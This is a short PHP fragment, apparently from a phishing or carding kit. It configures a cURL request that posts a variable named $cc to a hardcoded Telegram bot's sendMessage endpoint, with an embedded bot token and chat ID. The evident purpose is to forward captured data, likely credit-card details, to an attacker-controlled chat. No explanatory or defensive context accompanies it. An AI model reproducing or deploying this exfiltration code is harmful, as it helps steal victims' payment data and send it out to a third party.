...
curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1340802837:AAG-Qw5lSrnnJjA-wPppuI-h823zV0rOcXc/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=1016625404&text=".$cc."");
